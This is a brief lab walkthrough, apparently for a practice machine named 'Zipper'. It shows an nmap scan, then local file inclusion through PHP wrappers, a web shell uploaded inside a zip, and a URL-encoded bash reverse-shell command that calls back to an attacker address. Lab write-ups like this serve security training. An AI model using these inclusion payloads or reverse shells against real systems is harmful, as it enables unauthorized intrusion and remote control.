## NMAP
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80 HTTP
![image](https://hackmd.io/_uploads/rJG7tX4j-l.png)
![image](https://hackmd.io/_uploads/SJoMLQEsbg.png)
![image](https://hackmd.io/_uploads/r1zD8mEsWe.png)
`http://192.168.194.229/index.php?file=http://....` -> `fail`
`http://192.168.194.229/index.php?file=file://....` -> `fail`
`http://192.168.194.229/index.php?file=php://....` -> `works`
`http://192.168.194.229/index.php?file=php://filter/convert.base64-encode/resource=upload`
![image](https://hackmd.io/_uploads/ByQLqmNi-e.png)
![image](https://hackmd.io/_uploads/HJ5q9XViZx.png)
![image](https://hackmd.io/_uploads/ryFoqXEsZg.png)
upload an webshell, and download a zip file from target response, zip name is `upload_1774626502.zip`
`http://192.168.194.229/index.php?file=zip://uploads/upload_1774626502.zip%23rev.php` -> `fail`
`http://192.168.194.229/index.php?file=zip://uploads/upload_1774626502.zip%23rev` -> `works`
![image](https://hackmd.io/_uploads/SkTs67Ni-g.png)
`http://192.168.194.229/index.php?file=zip://uploads/upload_1774626502.zip%23rev&cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.205%2F80+0%3E%261` -> `somehow not working`
![image](https://hackmd.io/_uploads/r1jTA74sWe.png)
`http://192.168.194.229/index.php?file=zip://uploads/upload_1774628460.zip%23pentestmonkey`
![image](https://hackmd.io/_uploads/S1PyyVNibe.png)

## Privilege Escalation
![image](https://hackmd.io/_uploads/By3IZVNiWx.png)
![image](https://hackmd.io/_uploads/Skm6XNNiZx.png)
![image](https://hackmd.io/_uploads/H1M0m4ViWx.png)
![image](https://hackmd.io/_uploads/HyvxBE4obl.png)
